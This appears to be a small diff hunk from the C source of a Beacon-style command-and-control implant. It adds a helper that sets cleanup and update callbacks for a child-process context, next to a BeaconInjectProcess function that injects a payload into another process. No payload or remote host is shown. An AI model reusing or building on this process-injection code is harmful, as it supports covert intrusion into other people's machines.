@@ -887,6 +887,13 @@ void CleanupChildProcessContext(PRUN_UNDER_CONTEXT context)
 	if (&SetErrorMode)
 		SetErrorMode(context->previousErrorMode);
 }
+
+PRUN_UNDER_CONTEXT ChildProcessContextInit(PRUN_UNDER_CONTEXT context)
+{
+	context->updateProcessAttributes = UpdateChildProcessContext;
+	context->cleanup = CleanupChildProcessContext;
+	return context;
+}
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
